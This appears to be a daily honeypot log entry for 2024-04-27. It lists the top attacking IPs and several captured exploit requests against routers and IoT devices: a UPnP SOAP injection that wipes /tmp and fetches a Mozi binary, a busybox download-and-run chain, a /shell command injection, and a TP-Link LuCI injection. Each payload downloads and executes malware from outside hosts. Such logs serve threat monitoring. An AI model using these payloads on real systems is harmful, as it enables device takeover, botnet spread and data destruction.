@@ -1,0 +1,47 @@
+Top 5 IPs for 2024-04-27 :
+
+34.219.85.230
+211.199.251.200
+185.150.26.251
+59.20.40.89
+211.246.230.23
+
+Malware Download:
+
+No malwares observed
+
+Commands/exploits observed:
+
+POST /soap.cgi?service=WANIPConn1 HTTP/1.1
+Host: HOST IP
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: */*
+User-Agent: Hello, World
+Connection: keep-alive
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"><NewPortMappingDescription><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://123.4.171.170:41005/Mozi.m;/tmp/Mozi.m dlink`</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>634</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>45</NewInternalPort></m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>
+
+
+
+
+cd /data/local/tmp/; rm arm*; busybox wget http://85.239.33.65/arm7; chmod +x arm7; ./arm7 android; busybox wget http://85.239.33.65/arm5; chmod +x arm5; ./arm5 android; busybox wget http://85.239.33.65/arm4; chmod +x arm4; ./arm4 android; busybox wget http://85.239.33.65/arm7; chmod +x arm6; ./arm6 android;
+
+
+
+GET /shell?cd+/tmp;rm+arm5+arm7+arm4;wget+http:/\\/85.239.33.65/arm7;chmod+777+arm7;./arm7+ipcams;wget+http:/\\/85.239.33.65/arm5;chmod+777+arm5;./arm5+ipcams;wget+http:/\\/85.239.33.65/arm4;chmod+777+arm4;./arm4+ipcams; HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+
+
+
+GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.163.214.97/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`) HTTP/1.1
+Host: HOST-IP
+User-Agent: Go-http-client/1.1
+
